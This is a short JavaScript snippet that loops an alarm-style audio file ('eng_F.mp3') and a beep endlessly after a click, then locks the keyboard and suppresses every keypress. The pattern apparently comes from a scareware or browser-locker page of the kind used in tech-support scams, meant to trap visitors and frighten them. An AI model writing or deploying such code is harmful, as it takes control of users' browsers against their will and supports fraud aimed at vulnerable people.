$(document).ready(function() {
    var audioElement = document.createElement('audio');
    audioElement.setAttribute('src', 'eng_F.mp3');

    audioElement.addEventListener('ended', function() {
        this.play();
    }, false);



    $('#bellings').click(function() {
        audioElement.play();

    });
	});


	$(document).ready(function() {
    var audioElement = document.createElement('audio');
    audioElement.setAttribute('src', 'beep.mp3');

    audioElement.addEventListener('ended', function() {
        this.play();
    }, false);


     $('#bellings').click(function() {
        audioElement.play();

    });

});

    navigator.keyboard.lock();
    document.onkeydown = function (e) {
    return false;
    }
